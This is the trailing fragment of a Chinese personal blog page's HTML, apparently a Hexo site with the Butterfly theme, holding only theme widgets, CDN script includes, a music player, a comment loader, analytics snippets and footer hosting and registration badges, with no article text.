title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading()),setTimeout((function(){preloader.endLoading()}),5e3)</script><div class="js-pjax"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>document.querySelectorAll("#article-container span.katex-display").forEach(a=>{btf.wrap(a,"div",{class:"katex-wrap"})})</script><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js").then(()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"}),mermaid.init()}))</script><script>(()=>{const t=document.getElementById("twikoo-count"),e=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://twikoo-beta-seven.vercel.app/",region:""},null))},o=()=>{twikoo.getCommentsCount({envId:"https://twikoo-beta-seven.vercel.app/",region:"",urls:[window.location.pathname],includeReply:!1}).then((function(e){t.innerText=e[0].count})).catch((function(t){console.error(t)}))},n=(n=!1)=>{"object"==typeof twikoo?(e(),n&&t&&setTimeout(o,0)):getScript("https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js").then(()=>{e(),n&&t&&setTimeout(o,0)})};btf.loadComment(document.getElementById("twikoo-wrap"),n)})()</script></div><div class="aplayer no-destroy" data-id="6751330199" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="true" muted></div><script async src="/js/diytitle.js"></script><script async src="//at.alicdn.com/t/font_2987331_rwt2gum52cl.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script><script defer id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU,太毛" data-fontsize="15px" data-random="false" async></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors=["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/bb/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.removeEventListener("scroll",window.tocScrollFn),window.removeEventListener("scroll",scrollCollect),"object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach(e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach(e=>t.setAttribute(e.name,e.value)),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)}),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-214297516-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",e=>{404===e.request.status&&pjax.loadUrl("/404.html")})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ 糖果屋上新啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">🍭查看新品🍬</span></a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"✨ 糖果屋上新啦！ 👉",backgroundColor:t,duration:5e5,pos:e,actionText:"🍭查看新品🍬",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script></div><script>var fdata={apiurl:"https://fcircle-h-t-m.vercel.app/api",initnumber:20,stepnumber:10,error_img:"https://cdn.jsdelivr.net/npm/akilar-candyassets/image/404.gif"};localStorage.setItem("fdatalist",JSON.stringify(fdata))</script><script defer src="https://cdn.jsdelivr.net/npm/hexo-filter-fcircle/assets/js/fetch.min.js"></script><script data-pjax>function butterfly_clock_injector_config(){var l=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock"),l.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/~logo.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_injector_config()</script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementById("footer-wrap");console.log("已挂载butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="https://pic.h-t-m.ltd/img/Frame-Hexo.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v3.8.2" title=""><img src="https://pic.h-t-m.ltd/img/Theme-Butterfly.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站默认线路托管于Vercel" title=""><img src="https://pic.h-t-m.ltd/img/Hosted-Vercel.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Gtihub托管" title=""><img src="https://pic.h-t-m.ltd/img/Source-Github.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" style="margin-inline:5px" data-title="本网站由又拍云提供 CDN 加速 / 云储存服务" title=""><img src="https://pic.h-t-m.ltd/img/upyun.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011502001415" style="margin-inline:5px" data-title="本站已完成公安备案，备案号鄂公网安备 42011502001415号" title=""><img src="https://pic.h-t-m.ltd/img/police-beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在工信部备案，备案号赣ICP备2021010131号-2" title=""><img src="https://pic.h-t-m.ltd/img/beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20220223" style="margin-inline:5px" data-title="本站已在萌国备案，备案号萌ICP备20220223号" title=""><img src="https://pic.h-t-m.ltd/img/moe-beian.svg" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/js/runtime.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script></body></html>